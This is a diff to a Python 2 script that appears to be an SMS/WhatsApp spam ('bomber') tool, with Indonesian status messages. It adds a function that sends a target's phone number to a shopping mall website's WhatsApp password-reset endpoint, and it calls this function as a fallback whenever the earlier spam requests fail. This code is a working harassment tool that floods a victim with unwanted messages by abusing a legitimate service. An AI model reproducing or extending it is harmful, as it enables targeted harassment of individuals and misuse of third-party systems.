@@ -29,6 +29,11 @@ def spamsatu():
    sil += 1
    sys.stdout.write('\r%s[%s!%s] %sSuccess %s(%sSukses%s:%s%s|%sGagal%s:%s%s)'%(pu,me,pu,hi,pu,hi,pu,sil,pu,me,pu,gal,pu))
    sys.stdout.flash()
+def caralain(no):
+  caralin = requests.post("https://tasya.tunjunganplaza.com/login/forgotten",data={'whatsapp':'0'+no}).text
+  if json.loads(caralin)["cond"] == "success":
+   print "%s[%s!%s] %sSuccess"%(pu,me,pu,hi)
+  else:print "%s[%s!%s] %sGagal"%(pu,me,pu,me)
 def check(no,pw):
  #tik('Mengecek apakah no yg kamu masukkan, sudah terdaftar atau blm')
  tik('Mengecek registari...')
@@ -87,13 +92,14 @@ def modesatu():
     else:
      sil = sil-1
   else:
-   gal += 1
-   sys.stdout.write('\r%s[%s!%s] %sFailed %s(%sSukses%s:%s%s|%sGagal%s:%s%s)'%(pu,me,pu,me,pu,hi,pu,sil,pu,me,pu,gal,pu))
-   sys.stdout.flush()
-   if primitif == jumlah:
-    if gal == 0:pass
-    else:
-     gal = gal-1
+   caralain(nomor)
+   #gal += 1
+   #sys.stdout.write('\r%s[%s!%s] %sFailed %s(%sSukses%s:%s%s|%sGagal%s:%s%s)'%(pu,me,pu,me,pu,hi,pu,sil,pu,me,pu,gal,pu))
+   #sys.stdout.flush()
+   #if primitif == jumlah:
+    #if gal == 0:pass
+    #else:
+     #gal = gal-1
  print "\n%s[%s!%s] %sSelesai.."%(pu,me,pu,hi)
 
 def modeduaext(hh):
@@ -101,7 +107,7 @@ def modeduaext(hh):
    if json.loads(lala)["pesan"] == "Success":
     print "%s[%s!%s] %sSuccess"%(pu,me,pu,hi)
    else:
-    print "%s[%s!%s] %sGagal"%(pu,me,pu,me)
+    caralain(nomor)
 def modedua():
  while True:
   global nomor
